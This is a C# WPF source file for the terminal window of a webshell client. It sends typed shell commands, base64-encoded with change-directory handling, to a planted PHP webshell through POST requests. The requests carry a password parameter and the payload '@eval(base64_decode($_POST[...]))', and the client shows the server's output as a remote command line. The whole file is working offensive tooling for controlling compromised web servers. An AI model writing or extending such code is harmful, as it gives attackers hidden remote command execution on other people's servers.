using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using WpfApp1.Payload.php;
using WpfApp1.Utli;
using static System.Net.Mime.MediaTypeNames;

namespace WpfApp1.UI
{
    /// <summary>
    /// Window1.xaml 的交互逻辑
    /// </summary>
    public partial class Window1 : Window
    {
        /// <summary>
        /// url
        /// </summary>
        string urls = string.Empty;
        /// <summary>
        /// 密码
        /// </summary>
        string Password = string.Empty;


        /// <summary>
        /// url
        /// </summary>
        public string getUrl { get; set; }
        /// <summary>
        /// 密码
        /// </summary>
        public string getPwd { get; set; }

        /// <summary>
        /// 引入post 请求类
        /// </summary>
        Post Post = new Post();




        /// <summary>
        /// 引入payload
        /// </summary>
        Controller payload = new Controller();
        /// <summary>
        /// 引入base64
        /// </summary>
        encrypt encrypt = new encrypt();


        private List<string> rootlist = new List<string>();
        private string wroot = string.Empty;
        public Window1()
        {
            InitializeComponent();
            
          

        }

    

        private void MyTextBox_PreviewKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Enter))
            {
                e.Handled = true;
                var command = MyTextBox.Text.Trim();

                if (command.Contains("cd"))
                {
                    ChangeDirectory(command);
                }
                else if (command.Contains("cls"))
                {
                    ClearTerminal();
                }
                else
                {
                    ExecuteCommand(command);
                }

                //MyTextBox.AppendText(wroot + ">");
                //MyTextBox.SelectionStart = MyTextBox.Text.Length;
            }
        }

        private void ChangeDirectory(string command)
        {
            //wroot = command.Substring(2); // 获取cd命令后面的目录路径
            string[] parts = command.Split(' '); // 使用空格分割字符串
            if (parts.Length > 1)
            {
                 wroot = parts[1]; // 获取第二个元素
                //Console.WriteLine($"Directory: {directory}");
            }
            //获取> 后面的字符
            //string Cmd = command.Substring(command.LastIndexOf(">") + 1, MyTextBox.Text.Length - command.LastIndexOf(">") - 1);

            //string text = GetHtml(Cmd);
            MyTextBox.Text += "\n" + wroot + ">";
           
            
        }

        private void ClearTerminal()
        {
            MyTextBox.Text = "> ";
        }

        private void ExecuteCommand(string command)
        {
            
            //获取> 后面的字符
            string Cmd = command.Substring(command.LastIndexOf(">") + 1, MyTextBox.Text.Length - command.LastIndexOf(">") - 1);

            string text = GetHtml(Cmd);
            MyTextBox.Text += "\n\t\r" + text + "\n" + wroot + ">";
            //CmdList.Add(txt);
            MyTextBox.SelectionStart = MyTextBox.Text.Length + 1;

           // MyTextBox.AppendText($"Command not recognized: {command}");
            //MyTextBox.AppendText(Environment.NewLine);
        }

        /// <summary>
        /// 初始化窗口 加载数据
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            Wroot();

            //获取webshell当前目录
            foreach (var root in rootlist)
            {
                wroot = root;

            }

            this.MyTextBox.Text = wroot + ">";
        }
        /// <summary>
        /// 获取shell 当前根目录路径
        /// </summary>
        public void Wroot()
        {

            urls = getUrl;
            Password = getPwd;

            //获取webshell当前目录
            string Wroot = payload.Wroot();
            string z1 = "@eval(base64_decode($_POST['z1']));";
            string c = z1 + "&z1=" + Wroot;
            string Wroots = Post.Postring(urls, new Dictionary<string, string> { { Password, c } });

            if (Wroots == "webshell连接超时")
            {

                this.Close();
                MessageBox.Show("链接超时或者网络原因！");
            }
            rootlist.Add(Wroots.Replace("/", "\\"));

        }

        /// <summary>
        /// 发送POST请求获取数据
        /// </summary>
        /// <param name="cmd"></param>
        /// <returns></returns>
        public string GetHtml(string cmd)
        {
            string rsults = string.Empty;
            try
            {
                //获取webshell当前目录
                urls = getUrl;
                Password = getPwd;

                string z2 = "%40eval(%40base64_decode(%24_POST%5B'z2'%5D))%3B";

                string z1 = String.Format("cd /d \"{0}\"&{1}&echo", wroot, cmd);
                string Base64Z1 = encrypt.EncodeBase64("utf-8", z1);
                string h1 = encrypt.EncodeBase64("utf-8", "cmd");

                string Cmd = payload.Cmd();
                string UrlCmd = System.Web.HttpUtility.UrlDecode(Cmd);
                //    string HtmlUrl = System.Web.HttpUtility.HtmlEncode(UrlCmd);
                string Base64Cmd = encrypt.EncodeBase64("utf-8", UrlCmd);
                string outs = Cmd + "&z1=" + Base64Z1 + "&cmd=" + h1;

                rsults = Post.Postring(urls, new Dictionary<string, string> { { Password, outs } });


                if (rsults == "webshell连接超时")
                {

                    this.Close();
                    MessageBox.Show("链接超时或者网络原因！");
                }

            }
            catch
            {
                MessageBox.Show("Error");
            }
            return rsults.Replace("/c \"cmd\" ", "").Replace("-c cmd", "目录: ");
            //原来编码 目标编码
            //GBK	WINDOWS-1252
            //GBK	ISO-8859-1
        }




        }
    }
